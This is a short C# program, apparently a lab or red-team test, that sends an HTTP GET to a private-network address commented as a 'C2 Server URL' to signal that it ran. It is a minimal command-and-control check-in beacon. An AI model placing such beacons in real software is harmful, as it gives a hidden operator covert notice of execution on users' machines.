using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace C2ExecutorCheck
{
class Program
{
static async Task Main(string[] args)
{
await SendExecutionCheck();
}
private static async Task SendExecutionCheck()
{
using (HttpClient client = new HttpClient())
{
string url = "http://192.168.1.104:5000/"; // C2 Server URL
HttpResponseMessage response = await client.GetAsync(url);
}
}
}
}